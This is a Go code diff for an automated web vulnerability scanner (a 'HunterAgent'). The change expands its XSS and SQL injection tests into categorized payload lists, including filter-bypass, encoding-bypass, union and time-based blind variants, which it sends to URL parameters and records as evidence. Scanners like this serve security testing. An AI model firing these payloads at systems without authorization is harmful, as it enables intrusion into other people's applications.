@@ -209,14 +209,34 @@ func (h *HunterAgent) executeStrategy(ctx context.Context) error {
 	return nil
 }
 
-// testXSS tests for XSS vulnerabilities
+// testXSS tests for XSS vulnerabilities with multiple payload types
 func (h *HunterAgent) testXSS(ctx context.Context, urls []models.FoundURL) {
-	payloads := []string{
-		"<script>alert(1)</script>",
-		"'><script>alert(1)</script>",
-		"\"><script>alert(1)</script>",
-		"<img src=x onerror=alert(1)>",
-		"javascript:alert(1)",
+	// Categorized payloads for different contexts
+	payloadSets := map[string][]string{
+		"basic": {
+			"<script>alert(1)</script>",
+			"'><script>alert(1)</script>",
+			"\"><script>alert(1)</script>",
+		},
+		"event_handler": {
+			"<img src=x onerror=alert(1)>",
+			"<svg onload=alert(1)>",
+			"<body onload=alert(1)>",
+			"<input onfocus=alert(1) autofocus>",
+			"<details open ontoggle=alert(1)>",
+		},
+		"encoding_bypass": {
+			"<script>alert(String.fromCharCode(88,83,83))</script>",
+			"javascript:alert(1)",
+			"<img src=\"javascript:alert(1)\">",
+			"<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
+		},
+		"filter_bypass": {
+			"<scr<script>ipt>alert(1)</scr</script>ipt>",
+			"<SCRIPT>alert(1)</SCRIPT>",
+			"<scr\x00ipt>alert(1)</scr\x00ipt>",
+			"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+		},
 	}
 	
 	for _, u := range urls {
@@ -226,46 +246,75 @@ func (h *HunterAgent) testXSS(ctx context.Context, urls []models.FoundURL) {
 		}
 		
 		for _, param := range params {
-			for _, payload := range payloads {
-				result := h.httpClient.SendPayload("GET", u.Value, payload, "param:"+param)
-				
-				analysis := AnalyzeXSSResponse(result, payload)
-				
-				evidence := Evidence{
-					TestType:   "xss",
-					Target:     u.Value,
-					Parameter:  param,
-					Payload:    payload,
-					Result:     result,
-					Analysis:   analysis,
-					Confidence: analysis.Confidence,
-					Severity:   analysis.Severity,
-				}
-				
-				if analysis.IsVulnerable {
-					evidence.Status = "confirmed"
-					evidence.PoC = fmt.Sprintf("GET %s?%s=%s", u.Value, param, payload)
-					log.Printf("[Hunter] XSS FOUND: %s?%s=%s (confidence: %.2f)", u.Value, param, payload, analysis.Confidence)
-				}
-				
-				h.evidence.Add(evidence)
-				
-				if analysis.IsVulnerable && analysis.Confidence > 0.7 {
+			found := false
+			for category, payloads := range payloadSets {
+				if found {
 					break
+				}
+				for _, payload := range payloads {
+					result := h.httpClient.SendPayload("GET", u.Value, payload, "param:"+param)
+					
+					analysis := AnalyzeXSSResponse(result, payload)
+					
+					evidence := Evidence{
+						TestType:   "xss",
+						Target:     u.Value,
+						Parameter:  param,
+						Payload:    payload,
+						Result:     result,
+						Analysis:   analysis,
+						Confidence: analysis.Confidence,
+						Severity:   analysis.Severity,
+						Metadata: map[string]interface{}{
+							"payload_category": category,
+						},
+					}
+					
+					if analysis.IsVulnerable {
+						evidence.Status = "confirmed"
+						evidence.PoC = fmt.Sprintf("GET %s?%s=%s", u.Value, param, payload)
+						log.Printf("[Hunter] XSS FOUND [%s]: %s?%s=%s (confidence: %.2f)", category, u.Value, param, payload, analysis.Confidence)
+						found = true
+					}
+					
+					h.evidence.Add(evidence)
 				}
 			}
 		}
 	}
 }
 
-// testSQLi tests for SQL injection
+// testSQLi tests for SQL injection with multiple techniques
 func (h *HunterAgent) testSQLi(ctx context.Context, urls []models.FoundURL) {
-	payloads := []string{
-		"'",
-		"' OR '1'='1",
-		"1' AND '1'='1",
-		"' UNION SELECT NULL--",
-		"1; WAITFOR DELAY '0:0:5'--",
+	// Categorized SQLi payloads
+	payloadSets := map[string][]string{
+		"error_based": {
+			"'",
+			"\"",
+			"' OR '1'='1",
+			"' OR '1'='1'--",
+			"' OR '1'='1'/*",
+			"1' AND '1'='1",
+			"admin'--",
+		},
+		"union_based": {
+			"' UNION SELECT NULL--",
+			"' UNION SELECT NULL,NULL--",
+			"' UNION SELECT NULL,NULL,NULL--",
+			"' UNION ALL SELECT NULL--",
+		},
+		"blind_boolean": {
+			"' AND 1=1--",
+			"' AND 1=2--",
+			"' OR 1=1--",
+			"' OR 1=2--",
+		},
+		"blind_time": {
+			"'; WAITFOR DELAY '0:0:5'--",
+			"' AND SLEEP(5)--",
+			"' AND pg_sleep(5)--",
+			"1; WAITFOR DELAY '0:0:5'--",
+		},
 	}
 	
 	for _, u := range urls {
@@ -275,32 +324,38 @@ func (h *HunterAgent) testSQLi(ctx context.Context, urls []models.FoundURL) {
 		}
 		
 		for _, param := range params {
-			for _, payload := range payloads {
-				result := h.httpClient.SendPayload("GET", u.Value, payload, "param:"+param)
-				
-				analysis := AnalyzeSQLiResponse(result, payload)
-				
-				evidence := Evidence{
-					TestType:   "sqli",
-					Target:     u.Value,
-					Parameter:  param,
-					Payload:    payload,
-					Result:     result,
-					Analysis:   analysis,
-					Confidence: analysis.Confidence,
-					Severity:   analysis.Severity,
-				}
-				
-				if analysis.IsVulnerable {
-					evidence.Status = "confirmed"
-					evidence.PoC = fmt.Sprintf("GET %s?%s=%s", u.Value, param, payload)
-					log.Printf("[Hunter] SQLi FOUND: %s?%s=%s (confidence: %.2f)", u.Value, param, payload, analysis.Confidence)
-				}
-				
-				h.evidence.Add(evidence)
-				
-				if analysis.IsVulnerable && analysis.Confidence > 0.7 {
+			found := false
+			for category, payloads := range payloadSets {
+				if found {
 					break
+				}
+				for _, payload := range payloads {
+					result := h.httpClient.SendPayload("GET", u.Value, payload, "param:"+param)
+					
+					analysis := AnalyzeSQLiResponse(result, payload)
+					
+					evidence := Evidence{
+						TestType:   "sqli",
+						Target:     u.Value,
+						Parameter:  param,
+						Payload:    payload,
+						Result:     result,
+						Analysis:   analysis,
+						Confidence: analysis.Confidence,
+						Severity:   analysis.Severity,
+						Metadata: map[string]interface{}{
+							"payload_category": category,
+						},
+					}
+					
+					if analysis.IsVulnerable {
+						evidence.Status = "confirmed"
+						evidence.PoC = fmt.Sprintf("GET %s?%s=%s", u.Value, param, payload)
+						log.Printf("[Hunter] SQLi FOUND [%s]: %s?%s=%s (confidence: %.2f)", category, u.Value, param, payload, analysis.Confidence)
+						found = true
+					}
+					
+					h.evidence.Add(evidence)
 				}
 			}
 		}
